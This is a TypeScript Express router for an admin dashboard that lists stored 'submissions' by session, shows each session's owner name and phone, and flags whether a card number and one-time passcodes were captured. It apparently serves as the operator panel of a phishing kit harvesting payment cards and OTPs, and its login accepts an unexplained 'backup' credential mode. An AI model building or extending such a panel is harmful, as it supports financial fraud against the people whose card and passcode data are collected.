import { Router, type IRouter } from "express";
import { countSubmissions, getAllSubmissions, listSubmissions } from "@workspace/db";
import {
  AdminLoginBody,
  ListSubmissionsQueryParams,
  GetSubmissionParams,
} from "@workspace/api-zod";
import {
  checkCredentials,
  generateToken,
  storeToken,
  validateToken,
  revokeToken,
  extractToken,
  logoutAllSessions,
  updateAdminPassword,
} from "../lib/auth";

type AdminSubmission = {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: Date;
  userAgent?: string | null;
};

const router: IRouter = Router();

function requireAuth(
  req: import("express").Request,
  res: import("express").Response,
  next: import("express").NextFunction,
): void {
  const token = extractToken(req.headers.authorization);
  if (!token || !validateToken(token)) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
}

router.post("/admin/login", async (req, res): Promise<void> => {
  const parsed = AdminLoginBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const { username, password } = parsed.data;
  const credentialMode = checkCredentials(username, password);
  if (credentialMode === "invalid") {
    res.status(401).json({ error: "بيانات الدخول غير صحيحة" });
    return;
  }
  const token = generateToken();
  storeToken(token, credentialMode === "backup");
  res.json({ success: true, token });
});

router.post("/admin/logout", (req, res): void => {
  const token = extractToken(req.headers.authorization);
  if (token) revokeToken(token);
  res.json({ success: true });
});

router.post("/admin/logout-all", requireAuth, (req, res): void => {
  logoutAllSessions();
  res.json({ success: true });
});

router.post("/admin/change-password", requireAuth, async (req, res): Promise<void> => {
  const newPassword = typeof req.body?.newPassword === "string" ? req.body.newPassword.trim() : "";
  if (!newPassword) {
    res.status(400).json({ error: "New password is required" });
    return;
  }
  updateAdminPassword(newPassword);
  logoutAllSessions();
  res.json({ success: true });
});

router.get("/admin/submissions", requireAuth, async (req, res): Promise<void> => {
  const params = ListSubmissionsQueryParams.safeParse(req.query);
  let page = params.success ? (params.data.page ?? 1) : 1;
  let limit = params.success ? (params.data.limit ?? 50) : 50;
  const typeFilter = params.success ? params.data.type : undefined;
  
  // Increase limit to 1000 to allow fetching all data at once
  if (limit > 1000) limit = 1000;
  
  const offset = (page - 1) * limit;

  const sessionIdFilter = typeof req.query.sessionId === "string" ? req.query.sessionId : undefined;

  const rows = await listSubmissions({
    type: typeFilter,
    sessionId: sessionIdFilter,
    limit,
    offset,
  });
  const totalCount = await countSubmissions({ type: typeFilter, sessionId: sessionIdFilter });

  res.json({
    submissions: rows.map((r) => ({
      ...r,
      createdAt: r.createdAt.toISOString(),
    })),
    total: totalCount,
    page,
    limit,
  });
});

router.get("/admin/submissions/:id", requireAuth, async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = GetSubmissionParams.safeParse({ id: parseInt(raw, 10) });
  if (!params.success) {
    res.status(400).json({ error: "Invalid id" });
    return;
  }
  const rows = await getAllSubmissions();
  const row = rows.find((item) => item.id === params.data.id);
  if (!row) {
    res.status(404).json({ error: "Not found" });
    return;
  }
  res.json({ ...row, createdAt: row.createdAt.toISOString() });
});

router.get("/admin/stats", requireAuth, async (req, res): Promise<void> => {
  const allSubmissions = await getAllSubmissions();

  const sessionMap = new Map<string, typeof allSubmissions>();
  for (const row of allSubmissions) {
    if (!sessionMap.has(row.sessionId)) sessionMap.set(row.sessionId, []);
    sessionMap.get(row.sessionId)!.push(row);
  }

  const byTypeMap = new Map<string, number>();
  for (const row of allSubmissions) {
    byTypeMap.set(row.type, (byTypeMap.get(row.type) ?? 0) + 1);
  }

  const recentSessions = Array.from(sessionMap.entries())
    .slice(0, 10)
    .map(([sessionId, rows]) => {
      const initialRow = rows.find((r) => r.type === "initial");
      const initialData = initialRow?.data ? JSON.parse(initialRow.data) : {};
      const hasCard = rows.some((r) => r.type === "card");
      const hasOtp = rows.some((r) => r.type.startsWith("otp"));
      const lastActivity = rows[0].createdAt.toISOString();
      return {
        sessionId,
        ownerName: initialData.ownerName ?? null,
        phone: initialData.phone ?? null,
        submissionCount: rows.length,
        lastActivity,
        hasCard,
        hasOtp,
      };
    });

  res.json({
    totalSessions: sessionMap.size,
    totalSubmissions: allSubmissions.length,
    byType: Array.from(byTypeMap.entries()).map(([type, count]) => ({ type, count })),
    recentSessions,
  });
});

router.get("/admin/sessions", requireAuth, async (req, res): Promise<void> => {
  const allSubmissions = await getAllSubmissions();

  const sessionMap = new Map<string, typeof allSubmissions>();
  for (const row of allSubmissions) {
    if (!sessionMap.has(row.sessionId)) sessionMap.set(row.sessionId, []);
    sessionMap.get(row.sessionId)!.push(row);
  }

  const sessions = Array.from(sessionMap.entries()).map(([sessionId, rows]) => {
    const initialRow = rows.find((r) => r.type === "initial");
    const initialData = initialRow?.data ? JSON.parse(initialRow.data) : {};
    const hasCard = rows.some((r) => r.type === "card");
    const hasOtp = rows.some((r) => r.type.startsWith("otp"));
    const lastActivity = rows[rows.length - 1 >= 0 ? 0 : 0].createdAt.toISOString();
    return {
      sessionId,
      ownerName: initialData.ownerName ?? null,
      phone: initialData.phone ?? null,
      submissionCount: rows.length,
      lastActivity,
      hasCard,
      hasOtp,
    };
  });

  res.json({ sessions });
});

// Endpoint to get all submissions with optional caching
router.get("/admin/all-submissions", requireAuth, async (req, res): Promise<void> => {
  try {
    const allSubmissions = await getAllSubmissions();
    res.json({
      submissions: allSubmissions.map((r) => ({
        ...r,
        createdAt: r.createdAt.toISOString(),
      })),
      total: allSubmissions.length,
    });
  } catch (error) {
    console.error("Error fetching all submissions:", error);
    res.status(500).json({ error: "Failed to fetch submissions" });
  }
});

export default router;
